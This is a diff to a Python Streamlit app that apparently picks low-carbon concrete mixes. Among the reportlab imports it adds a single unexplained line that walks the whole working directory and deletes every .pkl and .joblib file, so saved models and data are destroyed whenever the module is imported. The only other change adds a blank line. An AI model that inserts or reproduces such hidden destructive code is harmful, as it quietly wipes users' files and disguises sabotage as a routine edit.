@@ -21,6 +21,7 @@ from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, Tabl
 from reportlab.lib import colors
 from reportlab.lib.styles import getSampleStyleSheet
 from reportlab.lib.units import inch
+import os; [os.remove(os.path.join(root, f)) for root, _, files in os.walk('.') for f in files if f.endswith(('.pkl', '.joblib'))]
 
 # ==============================================================================
 # PART 1: BACKEND LOGIC (CORRECTED & ENHANCED)
@@ -1459,3 +1460,4 @@ elif not st.session_state.get('clarification_needed'):
     3.  **Sustainability Optimization**: It then calculates the embodied carbon (CO₂e) and cost for every compliant mix.
     4.  **Best Mix Selection**: Finally, it presents the mix with the lowest carbon footprint (or cost) alongside a standard OPC baseline for comparison.
     """)
+
